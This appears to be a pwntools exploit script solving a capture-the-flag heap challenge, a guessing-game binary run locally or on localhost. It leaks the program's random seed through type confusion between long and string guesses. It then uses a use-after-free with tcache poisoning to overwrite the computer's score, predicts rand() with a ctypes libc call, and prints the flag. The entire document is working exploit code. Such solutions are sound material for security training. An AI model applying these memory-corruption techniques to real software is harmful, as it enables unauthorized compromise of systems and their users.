from pwn import * 
from ctypes import CDLL

context.arch="x86_64"
elf = ELF("../challenge/chall")
libc = CDLL("libc.so.6")

def conn():
    if args.LOCAL:
        p = process("./chall")
        return p 
    elif args.REMOTE:
        HOST, PORT = "localhost", 9003 
        p = remote(HOST, PORT)
        return p
    else:
        exit(0)
        
def add_guess(option, guess):
    p.sendlineafter(">> ", "1")
    p.sendlineafter("Option: ", str(option))
    p.sendlineafter("Guess: ", guess)

def view_guess(option, index):
    p.sendlineafter(">>", "2")
    p.sendlineafter("Index: ", str(index))
    p.sendlineafter("Option: ", str(option))

def delete_guess(index):
    p.sendlineafter(">> ", "4")
    p.sendlineafter("Index: ", str(index))

def edit_guess(option, index, guess):
    p.sendlineafter(">> ", "3")
    p.sendlineafter("Index: ", str(index))
    p.sendlineafter("Option: ", str(option))
    p.sendlineafter("Guess: ", guess)

def main():
    global p 
    p = conn()

    options = {
        "string": 1, 
        "long": 2, 
        "double": 3
    }
    
    seed_addr = elf.symbols['seed']
    computer_score = elf.symbols['computer_score']
    
    #leaking libc seed
    add_guess(options["long"], str(seed_addr)) #index 0
    view_guess(options["string"], 0)
    p.recvuntil(b"is: ")
    libc_seed = p.recvline().rstrip().ljust(8, b"\x00")
    libc_seed = u64(libc_seed)
    log.info(f"seed: {hex(libc_seed)}")
    libc.srand(libc_seed)
    
    #use after free/tcache poisonning to overwrite computer score
    delete_guess(0)
    edit_guess(options["long"], 0, str(computer_score))
    add_guess(options["long"], str(123456)) #0
    add_guess(options["long"], str(0)) #1
    
    libc_guess = libc.rand()
    p.sendlineafter(">> ", "5")
    p.sendlineafter("here: ", str(libc_guess))
    p.recvline()
    p.recvline()
    flag = p.recv()
    print(flag)
    
if __name__ == "__main__":
    main()